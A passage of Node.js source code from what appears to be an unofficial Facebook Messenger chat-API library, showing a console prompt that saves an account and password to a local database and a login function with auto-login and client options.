    console.log(chalk.bold.hex('#9900FF')("[</>]") + chalk.bold.yellow(' => ') + "Operating System: " + chalk.bold.red(os.type()));
    console.log(chalk.bold.hex('#9900FF')("[</>]") + chalk.bold.yellow(' => ') + "Machine Version: " + chalk.bold.red(os.version()));
    console.log(chalk.bold.hex('#9900FF')("[</>]") + chalk.bold.yellow(' => ') + "Fca Version: " + chalk.bold.red(localbrand2) + '\n');
    try {
        rl.question(Language.TypeAccount, (Account) => {
            if (!Account.includes("@") && globalThis.Fca.Require.utils.getType(parseInt(Account)) != "Number") return logger.Normal(Language.TypeAccountError, function () { process.exit(1) }); //Very Human
                else rl.question(Language.TypePassword,async function (Password) {
                    rl.close();
                    try {
                        await Database.set("Account", Account);
                        await Database.set("Password", Password);
                    }
                    catch (e) {
                        logger.Warning(Language.ErrDataBase);
                            logger.Error();
                        process.exit(0);
                    }
                    if (globalThis.Fca.Require.FastConfig.ResetDataLogin) {
                        globalThis.Fca.Require.FastConfig.ResetDataLogin = false;
                        globalThis.Fca.Require.fs.writeFileSync('./FastConfigFca.json', JSON.stringify(globalThis.Fca.Require.FastConfig, null, 4));
                    }
                logger.Success(Language.SuccessSetData);
                process.exit(1);
            });
        })
    }
    catch (e) {
        logger.Error(e)
    }
}

/**
 * @param {{ email: any; password: any; appState: any; }} loginData
 * @param {{}} options
 * @param {(error: any, api: any) => any} callback
 */

function login(loginData, options, callback) {
    if (utils.getType(options) === 'Function' || utils.getType(options) === 'AsyncFunction') {
        callback = options;
        options = {};
    }

    var globalOptions = {
        selfListen: false,
        listenEvents: true,
        listenTyping: false,
        updatePresence: false,
        forceLogin: false,
        autoMarkDelivery: false,
        autoMarkRead: false,
        autoReconnect: true,
        logRecordSize: 100,
        online: false,
        emitReady: false,
        userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8"
    };
    
    if (loginData.email && loginData.password) {
        setOptions(globalOptions, {
            logLevel: "silent",
            forceLogin: true,
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36"
        });
    }
    else if (loginData.appState) {
        setOptions(globalOptions, options);
    }

    var prCallback = null;
    if (utils.getType(callback) !== "Function" && utils.getType(callback) !== "AsyncFunction") {
        var rejectFunc = null;
        var resolveFunc = null;
        var returnPromise = new Promise(function(resolve, reject) {
            resolveFunc = resolve;
            rejectFunc = reject;
        }); 
        prCallback = function(/** @type {any} */error, /** @type {any} */api) {
            if (error) return rejectFunc(error);
            return resolveFunc(api);
        };
        callback = prCallback;
    }
    
    (async function() {
        var Premium = require("./Extra/Src/Premium");
        globalThis.Fca.Data.PremText = await Premium(globalThis.Fca.Require.Security.create().uuid) || "Bạn Đang Sài Phiên Bản: Free !";
        if (!loginData.email && !loginData.password) {
            switch (globalThis.Fca.Require.FastConfig.AutoLogin) {
                case true: {
                    if (globalThis.Fca.Require.FastConfig.ResetDataLogin) return setUserNameAndPassWord();
                    else {
                        try {
                            if (await Database.get("TempState")) { 
                                try {
                                    loginData.appState = JSON.parse(await Database.get("TempState"));
                                }
                                catch (_) {
                                    loginData.appState = await Database.get("TempState");
                                }
                                await Database.delete("TempState");
                            }
                        }
                        catch (e) {
                            console.log(e)
                            await Database.delete("TempState");
                                logger.Warning(Language.ErrDataBase);
                                logger.Error();
                            process.exit(0);
                        }
                        try {
                            if (await Database.has('Account') && await Database.has('Password')) return loginHelper(loginData.appState, loginData.email, loginData.password, globalOptions, callback, prCallback);
                            else return setUserNameAndPassWord();
                        }
                        catch (e) {
                            logger.Warning(Language.ErrDataBase);
                                logger.Error();
                            process.exit(0);
                        }
                    }
                }
                case false: {
                    loginHelper(loginData.appState, loginData.email, loginData.password, globalOptions, callback, prCallback);
                }
            }
        }
        else loginHelper(loginData.appState, loginData.email, loginData.password, globalOptions, callback, prCallback);
    })()
    return returnPromise;
}

module.exports = login;
